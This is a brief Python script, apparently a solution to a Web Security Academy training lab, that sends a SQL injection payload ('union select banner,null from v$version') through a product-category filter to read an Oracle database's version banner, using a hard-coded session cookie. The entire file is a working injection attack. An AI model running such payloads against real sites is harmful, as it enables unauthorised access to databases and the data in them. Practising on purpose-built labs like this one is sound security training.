import requests

pathname="/filter?category=Accessories"
host="0a6700650482b9c980f726340064009d.web-security-academy.net"

payload="' union select banner,null from v$version -- -"

header ={
    "Cookie": "session=n4sgp8uuL8p0vKU3xgNBnVRK6TqyAj1Z",
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0"
}

res=requests.get(url="https://"+host+pathname+payload,headers=header)

print(res.status_code)
print(res.text)
